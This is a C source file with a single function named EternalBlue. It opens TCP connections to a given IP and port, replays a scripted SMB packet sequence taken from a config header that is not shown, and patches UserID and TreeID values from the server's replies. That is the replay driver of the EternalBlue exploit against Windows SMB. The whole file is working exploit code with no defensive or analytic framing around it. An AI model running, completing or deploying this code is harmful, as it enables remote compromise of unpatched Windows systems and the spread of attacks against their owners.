#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS];
    unsigned char userid[2] = { 0, 0 };
    unsigned char treeid[2] = { 0, 0 };
    WSADATA wsa_data;
    struct sockaddr_storage address;
    int address_length;
    int wsa_started = 0;
    int result = -1;
    size_t i;

    for (i = 0; i < NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (ip == NULL || port < 1 || port > 65535) {
        printf("EternalBlue: invalid address or port\n");
        return -1;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("EternalBlue: WSAStartup failed\n");
        return -1;
    }
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    if (InetPtonA(AF_INET, ip, &((struct sockaddr_in *)&address)->sin_addr) == 1) {
        struct sockaddr_in *address4 = (struct sockaddr_in *)&address;
        address4->sin_family = AF_INET;
        address4->sin_port = htons((u_short)port);
        address_length = (int)sizeof(*address4);
    } else if (InetPtonA(AF_INET6, ip, &((struct sockaddr_in6 *)&address)->sin6_addr) == 1) {
        struct sockaddr_in6 *address6 = (struct sockaddr_in6 *)&address;
        address6->sin6_family = AF_INET6;
        address6->sin6_port = htons((u_short)port);
        address_length = (int)sizeof(*address6);
    } else {
        printf("EternalBlue: invalid IP address\n");
        goto cleanup;
    }

    for (i = 0; i < EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        size_t stream_index;

        if (op->stream < 1 || op->stream > NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %u\n", (unsigned)i);
            goto cleanup;
        }
        stream_index = (size_t)op->stream - 1;

        if (op->kind == 0) {
            SOCKET s;

            if (sockets[stream_index] != INVALID_SOCKET) {
                printf("EternalBlue: stream %u is already connected\n", (unsigned)op->stream);
                goto cleanup;
            }
            s = socket(((struct sockaddr *)&address)->sa_family, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) {
                printf("EternalBlue: socket creation failed at operation %u\n", (unsigned)i);
                goto cleanup;
            }
            if (connect(s, (const struct sockaddr *)&address, address_length) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed at operation %u\n", (unsigned)i);
                closesocket(s);
                goto cleanup;
            }
            sockets[stream_index] = s;
            printf("EternalBlue: connected stream %u\n", (unsigned)op->stream);
        } else if (op->kind == 1) {
            size_t packet_size = sizeof(EB_PACKETS) - 1;
            size_t offset = (size_t)op->offset;
            size_t length = (size_t)op->length;
            unsigned char *buffer;
            size_t current_length;
            size_t pos;
            size_t sent_total = 0;

            if (sockets[stream_index] == INVALID_SOCKET ||
                offset > packet_size || length > packet_size - offset ||
                length == SIZE_MAX) {
                printf("EternalBlue: invalid send operation %u\n", (unsigned)i);
                goto cleanup;
            }

            buffer = (unsigned char *)malloc(length + 1);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed at operation %u\n", (unsigned)i);
                goto cleanup;
            }
            memcpy(buffer, EB_PACKETS + offset, length);
            current_length = length;
            buffer[current_length] = 0;

            {
                static const unsigned char userid_placeholder[] = "__USERID__PLACEHOLDER__";
                size_t placeholder_length = sizeof(userid_placeholder) - 1;
                pos = 0;
                while (pos + placeholder_length <= current_length) {
                    if (memcmp(buffer + pos, userid_placeholder, placeholder_length) == 0) {
                        memmove(buffer + pos + 2,
                                buffer + pos + placeholder_length,
                                current_length - pos - placeholder_length);
                        memcpy(buffer + pos, userid, 2);
                        current_length -= placeholder_length - 2;
                        pos += 2;
                    } else {
                        ++pos;
                    }
                }
            }

            {
                static const unsigned char treeid_placeholder[] = "__TREEID__PLACEHOLDER__";
                size_t placeholder_length = sizeof(treeid_placeholder) - 1;
                pos = 0;
                while (pos + placeholder_length <= current_length) {
                    if (memcmp(buffer + pos, treeid_placeholder, placeholder_length) == 0) {
                        memmove(buffer + pos + 2,
                                buffer + pos + placeholder_length,
                                current_length - pos - placeholder_length);
                        memcpy(buffer + pos, treeid, 2);
                        current_length -= placeholder_length - 2;
                        pos += 2;
                    } else {
                        ++pos;
                    }
                }
            }

            while (sent_total < current_length) {
                size_t remaining = current_length - sent_total;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int sent = send(sockets[stream_index],
                                (const char *)buffer + sent_total,
                                chunk,
                                0);
                if (sent == SOCKET_ERROR || sent == 0) {
                    printf("EternalBlue: send failed at operation %u\n", (unsigned)i);
                    free(buffer);
                    goto cleanup;
                }
                sent_total += (size_t)sent;
            }

            printf("EternalBlue: sent %u bytes on stream %u\n",
                   (unsigned)current_length, (unsigned)op->stream);
            free(buffer);
        } else if (op->kind == 2) {
            size_t length = (size_t)op->length;
            unsigned char *buffer;
            size_t received_total = 0;

            if (sockets[stream_index] == INVALID_SOCKET || length == SIZE_MAX) {
                printf("EternalBlue: invalid receive operation %u\n", (unsigned)i);
                goto cleanup;
            }

            buffer = (unsigned char *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed at operation %u\n", (unsigned)i);
                goto cleanup;
            }

            while (received_total < length) {
                size_t remaining = length - received_total;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int received = recv(sockets[stream_index],
                                    (char *)buffer + received_total,
                                    chunk,
                                    0);
                if (received == SOCKET_ERROR || received == 0) {
                    printf("EternalBlue: receive failed at operation %u\n", (unsigned)i);
                    free(buffer);
                    goto cleanup;
                }
                received_total += (size_t)received;
            }

            if (op->fix == 1) {
                if (length < 34) {
                    printf("EternalBlue: response too short to update UserID\n");
                    free(buffer);
                    goto cleanup;
                }
                memcpy(userid, buffer + 32, 2);
                printf("EternalBlue: updated UserID\n");
            } else if (op->fix == 2) {
                if (length < 30) {
                    printf("EternalBlue: response too short to update TreeID\n");
                    free(buffer);
                    goto cleanup;
                }
                memcpy(treeid, buffer + 28, 2);
                printf("EternalBlue: updated TreeID\n");
            }

            printf("EternalBlue: received %u bytes on stream %u\n",
                   (unsigned)length, (unsigned)op->stream);
            free(buffer);
        } else if (op->kind == 3) {
            if (sockets[stream_index] == INVALID_SOCKET) {
                printf("EternalBlue: stream %u is not connected\n", (unsigned)op->stream);
                goto cleanup;
            }
            if (closesocket(sockets[stream_index]) == SOCKET_ERROR) {
                sockets[stream_index] = INVALID_SOCKET;
                printf("EternalBlue: close failed at operation %u\n", (unsigned)i);
                goto cleanup;
            }
            sockets[stream_index] = INVALID_SOCKET;
            printf("EternalBlue: closed stream %u\n", (unsigned)op->stream);
        } else {
            printf("EternalBlue: invalid operation kind at operation %u\n", (unsigned)i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 0; i < NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET)
            closesocket(sockets[i]);
    }
    if (wsa_started)
        WSACleanup();
    return result;
}